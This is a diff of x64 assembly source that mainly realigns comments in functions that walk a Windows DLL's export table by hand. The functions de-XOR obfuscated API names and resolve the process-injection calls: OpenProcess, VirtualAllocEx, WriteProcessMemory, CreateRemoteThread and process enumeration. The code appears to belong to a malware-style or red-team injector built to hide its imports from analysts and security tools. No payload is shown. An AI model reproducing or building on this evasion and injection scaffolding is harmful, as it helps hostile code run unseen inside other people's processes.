@@ -748,9 +748,9 @@ get_proc_address_by_name:
     push rbp
     mov rbp, rsp
 
-    mov [rbp + 16], rcx         ; base addr
-    mov [rbp + 24], rdx         ; proc name
-    mov [rbp + 32], r8          ; proc name len
+    mov [rbp + 16], rcx                     ; base addr
+    mov [rbp + 24], rdx                     ; proc name
+    mov [rbp + 32], r8                      ; proc name len
 
     ; rbp - 8 = return value
     ; rbp - 16 = nt headers
@@ -765,76 +765,76 @@ get_proc_address_by_name:
     ; rbp - 336 = function name strlen
     ; rbp - 344 = rbx
     ; 8 bytes padding
-    sub rsp, 352                ; allocate local variable space
-    sub rsp, 32                 ; allocate shadow space
+    sub rsp, 352                            ; allocate local variable space
+    sub rsp, 32                             ; allocate shadow space
 
-    mov qword [rbp - 8], 0      ; return value
-    mov [rbp - 344], rbx        ; save rbx
+    mov qword [rbp - 8], 0                  ; return value
+    mov [rbp - 344], rbx                    ; save rbx
 
-    mov rbx, [rbp + 16]         ; base addr
-    add rbx, 0x3c               ; *e_lfa_new
+    mov rbx, [rbp + 16]                     ; base addr
+    add rbx, 0x3c                           ; *e_lfa_new
 
-    movzx ecx, word [rbx]       ; e_lfanew
+    movzx ecx, word [rbx]                   ; e_lfanew
 
-    mov rax, [rbp + 16]         ; base addr
-    add rax, rcx                ; nt header
+    mov rax, [rbp + 16]                     ; base addr
+    add rax, rcx                            ; nt header
 
-    mov [rbp - 16], rax         ; nt header
+    mov [rbp - 16], rax                     ; nt header
 
-    add rax, 24                 ; optional header
-    add rax, 112                ; export data directory
+    add rax, 24                             ; optional header
+    add rax, 112                            ; export data directory
 
-    mov [rbp - 24], rax         ; export data directory
+    mov [rbp - 24], rax                     ; export data directory
 
-    mov rax, [rbp + 16]         ; base addr
-    mov rcx, [rbp - 24]         ; export data directory
+    mov rax, [rbp + 16]                     ; base addr
+    mov rcx, [rbp - 24]                     ; export data directory
     mov ebx, [rcx]
-    add rax, rbx                ; export directory
+    add rax, rbx                            ; export directory
 
-    mov [rbp - 32], rax         ; export directory
+    mov [rbp - 32], rax                     ; export directory
 
-    add rax, 28                 ; address of functions rva
-    mov eax, [rax]              ; rva in rax
-    add rax, [rbp + 16]         ; base addr + address of function rva
+    add rax, 28                             ; address of functions rva
+    mov eax, [rax]                          ; rva in rax
+    add rax, [rbp + 16]                     ; base addr + address of function rva
 
-    mov [rbp - 40], rax         ; address of functions
+    mov [rbp - 40], rax                     ; address of functions
 
-    mov rax, [rbp - 32]         ; export directory
-    add rax, 32                 ; address of names rva
-    mov eax, [rax]              ; rva in rax
-    add rax, [rbp + 16]         ; base addr + address of names rva
+    mov rax, [rbp - 32]                     ; export directory
+    add rax, 32                             ; address of names rva
+    mov eax, [rax]                          ; rva in rax
+    add rax, [rbp + 16]                     ; base addr + address of names rva
 
-    mov [rbp - 48], rax         ; address of names
+    mov [rbp - 48], rax                     ; address of names
 
-    mov rax, [rbp - 32]         ; export directory
-    add rax, 36                 ; address of name ordinals
-    mov eax, [rax]              ; rva in rax
-    add rax, [rbp + 16]         ; base addr + address of name ordinals
+    mov rax, [rbp - 32]                     ; export directory
+    add rax, 36                             ; address of name ordinals
+    mov eax, [rax]                          ; rva in rax
+    add rax, [rbp + 16]                     ; base addr + address of name ordinals
 
-    mov [rbp - 56], rax         ; address of name ordinals
+    mov [rbp - 56], rax                     ; address of name ordinals
 
-    mov r10, [rbp - 32]         ; export directory
-    add r10, 24                 ; number of names
-    mov r10d, [r10]             ; number of names in r10
+    mov r10, [rbp - 32]                     ; export directory
+    add r10, 24                             ; number of names
+    mov r10d, [r10]                         ; number of names in r10
 
     xor r11, r11
 .loop_func_names:
     ; to index into an array, we multiply the size of each element with the 
     ; current index and add it to the base addr of the array
-    mov dword eax, 4            ; size of dword
-    mul r11                     ; size * index
-    mov rbx, [rbp - 48]         ; address of names
-    add rbx, rax                ; address of names + n
-    mov ebx, [rbx]              ; address of names [n]
+    mov dword eax, 4                        ; size of dword
+    mul r11                                 ; size * index
+    mov rbx, [rbp - 48]                     ; address of names
+    add rbx, rax                            ; address of names + n
+    mov ebx, [rbx]                          ; address of names [n]
 
-    add rbx, [rbp +  16]        ; base addr + address of names [n]
+    add rbx, [rbp +  16]                    ; base addr + address of names [n]
 
-    mov rcx, [rbp + 24]         ; proc name
+    mov rcx, [rbp + 24]                     ; proc name
     mov rdx, rbx
-    mov r8, [rbp + 32]          ; proc name len
+    mov r8, [rbp + 32]                      ; proc name len
     call strcmpiAA
 
-    cmp rax, 1                  ; are strings equal
+    cmp rax, 1                              ; are strings equal
     je .function_found
 
     inc r11
@@ -845,36 +845,36 @@ get_proc_address_by_name:
 
 .function_found:
     mov rax, 2
-    mul r11                     ; index * size of element of addrees of name ordinals(word)
-    add rax, [rbp - 56]         ; address of name ordinals + n
-    movzx eax, word [rax]       ; address of name ordinals [n]; index into address of functions
+    mul r11                                 ; index * size of element of addrees of name ordinals(word)
+    add rax, [rbp - 56]                     ; address of name ordinals + n
+    movzx eax, word [rax]                   ; address of name ordinals [n]; index into address of functions
 
-    mov rbx, 4                  ; size of element of address of functions(dword)
-    mul rbx                     ; index * size of element
-    add rax, [rbp - 40]         ; address of functions + index
-    mov eax, dword [rax]        ; address of functions [index]
+    mov rbx, 4                              ; size of element of address of functions(dword)
+    mul rbx                                 ; index * size of element
+    add rax, [rbp - 40]                     ; address of functions + index
+    mov eax, dword [rax]                    ; address of functions [index]
 
-    add rax, [rbp + 16]         ; base addr + address of functions [index]
+    add rax, [rbp + 16]                     ; base addr + address of functions [index]
 
-    mov [rbp - 8], rax          ; return value
+    mov [rbp - 8], rax                      ; return value
 
     ; check if the function is forwarded
-    mov r8, [rbp + 16]          ; base addr
-    mov rax, [rbp - 24]         ; export data directory
-    mov eax, [rax]              ; export data directory virtual address
-    add r8, rax                 ; base addr + virtual addr
+    mov r8, [rbp + 16]                      ; base addr
+    mov rax, [rbp - 24]                     ; export data directory
+    mov eax, [rax]                          ; export data directory virtual address
+    add r8, rax                             ; base addr + virtual addr
 
     mov r9, r8
-    mov rax, [rbp - 24]         ; export data directory
-    add rax, 4                  ; export data directory size
-    mov eax, [rax]              ; export data directory size
-    add r9, rax                 ; base addr + virtual addr + size
+    mov rax, [rbp - 24]                     ; export data directory
+    add rax, 4                              ; export data directory size
+    mov eax, [rax]                          ; export data directory size
+    add r9, rax                             ; base addr + virtual addr + size
 
-    cmp [rbp - 8], r8           ; below the start of the export directory
-    jl .shutdown                ; not forwarded
-                                ; or
-    cmp [rbp - 8], r9           ; above the end of the export directory
-    jg .shutdown                ; not forwarded
+    cmp [rbp - 8], r8                       ; below the start of the export directory
+    jl .shutdown                            ; not forwarded
+                                            ; or
+    cmp [rbp - 8], r9                       ; above the end of the export directory
+    jg .shutdown                            ; not forwarded
 
     ; make a copy of the string of the forwarded dll
     mov rcx, rbp
@@ -886,39 +886,39 @@ get_proc_address_by_name:
     mov rcx, rbp
     sub rcx, 312
     mov rdx, '.'
-    call strchr                 ; ptr to chr in rax
+    call strchr                             ; ptr to chr in rax
     
     mov byte [rax], 0
     inc rax
 
-    mov [rbp - 320], rax        ; forwarded function name
+    mov [rbp - 320], rax                    ; forwarded function name
 
     mov rcx, rbp
     sub rcx, 312
-    call [loadlibrary]     ; library addr
+    call [loadlibrary]                      ; library addr
 
-    mov [rbp - 328], rax        ; library addr
+    mov [rbp - 328], rax                    ; library addr
 
     sub rsp, 32
     mov rcx, [rbp - 320]
-    call strlen                 ; strlen in rax
+    call strlen                             ; strlen in rax
     add rsp, 32
 
-    mov [rbp - 336], rax        ; function name strlen
+    mov [rbp - 336], rax                    ; function name strlen
 
     mov rcx, [rbp - 328]
     mov rdx, [rbp - 320]
     mov r8, [rbp - 336]
-    call get_proc_address_by_name       ; proc addr
+    call get_proc_address_by_name           ; proc addr
 
-    mov [rbp - 8], rax          ; proc addr
+    mov [rbp - 8], rax                      ; proc addr
 
 .shutdown:
-    mov rbx, [rbp - 344]        ; restore rbx
-    mov rax, [rbp - 8]          ; return value
+    mov rbx, [rbp - 344]                    ; restore rbx
+    mov rax, [rbp - 8]                      ; return value
 
-    add rsp, 32                 ; free shadow space
-    add rsp, 352                ; free local variable space
+    add rsp, 32                             ; free shadow space
+    add rsp, 352                            ; free local variable space
 
     leave
     ret
@@ -933,26 +933,26 @@ get_proc_address_by_get_proc_addr:
     push rbp
     mov rbp, rsp
 
-    mov [rbp + 16], rcx         ; base addr
-    mov [rbp + 24], rdx         ; proc name
-    mov [rbp + 32], r8          ; proc name len
+    mov [rbp + 16], rcx                     ; base addr
+    mov [rbp + 24], rdx                     ; proc name
+    mov [rbp + 32], r8                      ; proc name len
 
     ; [rbp - 8] = return value
     ; 8 bytes padding
-    sub rsp, 16                 ; allocate local variable space
-    sub rsp, 32                 ; allocate shadow space
+    sub rsp, 16                             ; allocate local variable space
+    sub rsp, 32                             ; allocate shadow space
 
-    mov rcx, [rbp + 16]
-    mov rdx, [rbp + 24]
-    call [get_proc_addr]   ; proc addr
+    mov rcx, [rbp + 16]                     ; base addr
+    mov rdx, [rbp + 24]                     ; proc name
+    call [get_proc_addr]                    ; proc addr
 
-    mov [rbp - 8], rax          ; return value
+    mov [rbp - 8], rax                      ; return value
 
 .shutdown:
-    mov rax, [rbp - 8]          ; return value
+    mov rax, [rbp - 8]                      ; return value
 
-    add rsp, 32                 ; free shadow space
-    add rsp, 16                 ; free local variable space
+    add rsp, 32                             ; free shadow space
+    add rsp, 16                             ; free local variable space
 
     leave
     ret
@@ -967,15 +967,15 @@ unxor_and_get_proc_addr:
     push rbp
     mov rbp, rsp
 
-    mov [rbp + 16], rcx         ; base addr
-    mov [rbp + 24], rdx         ; xor str
-    mov [rbp + 32], r8          ; xor str len
-    mov [rbp + 40], r9          ; is get proc addr
+    mov [rbp + 16], rcx                         ; base addr
+    mov [rbp + 24], rdx                         ; xor str
+    mov [rbp + 32], r8                          ; xor str len
+    mov [rbp + 40], r9                          ; is get proc addr
 
     ; [rbp - 8] = return value
     ; 8 bytes padding
-    sub rsp, 16                 ; allocate local variable space
-    sub rsp, 32                 ; allocate shadow space
+    sub rsp, 16                                 ; allocate local variable space
+    sub rsp, 32                                 ; allocate shadow space
 
     mov rcx, [rbp + 24]
     mov rdx, [rbp + 32]
@@ -983,30 +983,30 @@ unxor_and_get_proc_addr:
     mov r9, xor_key.len
     call my_xor
 
-    cmp qword [rbp + 40], 1                   ; is get proc addr
+    cmp qword [rbp + 40], 1                     ; is get proc addr
     jne .not_get_proc_addr
-        mov rcx, [rbp + 16]
-        mov rdx, [rbp + 24]
-        mov r8, [rbp + 32]
+        mov rcx, [rbp + 16]                     ; base addr
+        mov rdx, [rbp + 24]                     ; xor str
+        mov r8, [rbp + 32]                      ; xor str len
         call get_proc_address_by_name
 
-        mov [rbp - 8], rax          ; proc addr
+        mov [rbp - 8], rax                      ; proc addr
 
         jmp .shutdown
 
 .not_get_proc_addr:
-    mov rcx, [rbp + 16]
-    mov rdx, [rbp + 24]
-    mov r8, [rbp + 32]
+    mov rcx, [rbp + 16]                         ; base addr
+    mov rdx, [rbp + 24]                         ; xor str
+    mov r8, [rbp + 32]                          ; xor str len
     call get_proc_address_by_get_proc_addr
 
-    mov [rbp - 8], rax          ; proc addr
+    mov [rbp - 8], rax                          ; proc addr
 
 .shutdown:
-    mov rax, [rbp - 8]          ; return value
+    mov rax, [rbp - 8]                          ; return value
 
-    add rsp, 32                 ; free shadow space
-    add rsp, 16                 ; free local variable space
+    add rsp, 32                                 ; free shadow space
+    add rsp, 16                                 ; free local variable space
 
     leave
     ret
@@ -1016,172 +1016,172 @@ populate_kernel_function_ptrs_by_name:
     push rbp
     mov rbp, rsp
 
-    mov [rbp + 16], rcx                     ; kernel base addr
+    mov [rbp + 16], rcx                         ; kernel base addr
 
-    sub rsp, 32                             ; allocate shadow space
+    sub rsp, 32                                 ; allocate shadow space
 
     mov rcx, [rbp + 16]
     mov rdx, get_proc_addr_xor
     mov r8, get_proc_addr_xor.len
     mov r9, 1
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [get_proc_addr], rax                ; GetProcAddress addr
+    mov [get_proc_addr], rax                    ; GetProcAddress addr
 
     mov rcx, [rbp + 16]
     mov rdx, get_last_error_xor
     mov r8, get_last_error_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [get_last_error], rax               ; GetLastError addr
+    mov [get_last_error], rax                   ; GetLastError addr
 
     mov rcx, [rbp + 16]
     mov rdx, loadlibrary_xor
     mov r8, loadlibrary_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [loadlibrary], rax                  ; LoadLibraryA addr
+    mov [loadlibrary], rax                      ; LoadLibraryA addr
 
     mov rcx, [rbp + 16]
     mov rdx, get_current_process_xor
     mov r8, get_current_process_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [get_current_process], rax          ; GetCurrentProcess addr
+    mov [get_current_process], rax              ; GetCurrentProcess addr
 
     mov rcx, [rbp + 16]
     mov rdx, open_process_xor
     mov r8, open_process_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [open_process], rax                 ; OpenProcess addr
+    mov [open_process], rax                     ; OpenProcess addr
 
     mov rcx, [rbp + 16]
     mov rdx, create_file_a_xor
     mov r8, create_file_a_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [create_file_a], rax                  ; CreateFileA addr
+    mov [create_file_a], rax                      ; CreateFileA addr
 
     mov rcx, [rbp + 16]
     mov rdx, write_file_xor
     mov r8, write_file_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [write_file], rax                   ; WriteFile addr
+    mov [write_file], rax                       ; WriteFile addr
 
     mov rcx, [rbp + 16]
     mov rdx, virtual_alloc_ex_xor
     mov r8, virtual_alloc_ex_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [virtual_alloc_ex], rax             ; VirtualAllocEx addr
+    mov [virtual_alloc_ex], rax                 ; VirtualAllocEx addr
 
     mov rcx, [rbp + 16]
     mov rdx, virtual_free_ex_xor
     mov r8, virtual_free_ex_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [virtual_free_ex], rax              ; VirtualFreeEx addr
+    mov [virtual_free_ex], rax                  ; VirtualFreeEx addr
 
     mov rcx, [rbp + 16]
     mov rdx, virtual_protect_ex_xor
     mov r8, virtual_protect_ex_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [virtual_protect_ex], rax           ; VirtualProtectEx addr
+    mov [virtual_protect_ex], rax               ; VirtualProtectEx addr
 
     mov rcx, [rbp + 16]
     mov rdx, read_process_memory_xor
     mov r8, read_process_memory_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [read_process_memory], rax          ; ReadProcessMemory addr
+    mov [read_process_memory], rax              ; ReadProcessMemory addr
 
     mov rcx, [rbp + 16]
     mov rdx, write_process_memory_xor
     mov r8, write_process_memory_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [write_process_memory], rax         ; WriteProcessMemory addr
+    mov [write_process_memory], rax             ; WriteProcessMemory addr
 
     mov rcx, [rbp + 16]
     mov rdx, create_remote_thread_xor
     mov r8, create_remote_thread_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [create_remote_thread], rax         ; CreateRemoteThread addr
+    mov [create_remote_thread], rax             ; CreateRemoteThread addr
      
     mov rcx, [rbp + 16]
     mov rdx, wait_for_single_object_xor
     mov r8, wait_for_single_object_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [wait_for_single_object], rax       ; WaitForSingleObject addr
+    mov [wait_for_single_object], rax           ; WaitForSingleObject addr
  
     mov rcx, [rbp + 16]
     mov rdx, close_handle_xor
     mov r8, close_handle_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [close_handle], rax                 ; CloseHandle addr
+    mov [close_handle], rax                     ; CloseHandle addr
 
     mov rcx, [rbp + 16]
     mov rdx, create_toolhelp32_snapshot_xor
     mov r8, create_toolhelp32_snapshot_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [create_toolhelp32_snapshot], rax   ; CreateToolhelp32Snapshot addr
+    mov [create_toolhelp32_snapshot], rax       ; CreateToolhelp32Snapshot addr
 
     mov rcx, [rbp + 16]
     mov rdx, process32_first_xor
     mov r8, process32_first_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [process32_first], rax              ; Process32First addr
+    mov [process32_first], rax                  ; Process32First addr
 
     mov rcx, [rbp + 16]
     mov rdx, process32_next_xor
     mov r8, process32_next_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [process32_next], rax               ;  Process32Next addr
+    mov [process32_next], rax                   ;  Process32Next addr
 
     mov rcx, [rbp + 16]
     mov rdx, sleep_xor
     mov r8, sleep_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [sleep], rax                        ; Sleep addr
+    mov [sleep], rax                            ; Sleep addr
 
     mov rcx, [rbp + 16]
     mov rdx, output_debug_string_a_xor
     mov r8, output_debug_string_a_xor.len
     xor r9, r9
-    call unxor_and_get_proc_addr            ; proc addr
+    call unxor_and_get_proc_addr                ; proc addr
 
-    mov [output_debug_string_a], rax        ; OutputDebugStringA addr
+    mov [output_debug_string_a], rax            ; OutputDebugStringA addr
 
 .shutdown:
-    add rsp, 32                             ; free shadow space
+    add rsp, 32                                 ; free shadow space
 
     leave
     ret
